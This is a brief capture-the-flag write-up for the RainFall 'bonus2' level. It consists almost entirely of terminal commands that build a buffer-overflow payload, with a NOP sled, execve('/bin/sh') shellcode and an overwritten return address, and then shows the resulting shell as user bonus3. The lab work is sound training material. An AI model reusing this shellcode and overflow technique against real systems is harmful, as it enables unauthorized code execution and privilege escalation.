# Bonus2

0xbffff638: 0x00000020

```c
bonus2@RainFall:~$ python -c "print 'B' * 18 + '\xc8\xf5\xff\xbf' + 'B' *30" > b
bonus2@RainFall:~$ python -c "print '\x90' * 6 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A' * 30" > a
bonus2@RainFall:~$ ./bonus2 `cat a` `cat b`
Hyvää päivää ������j
                    X�Rh//shh/bin��1�̀AAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����BBBBBBBBBB
$ whoami
bonus3
$
```
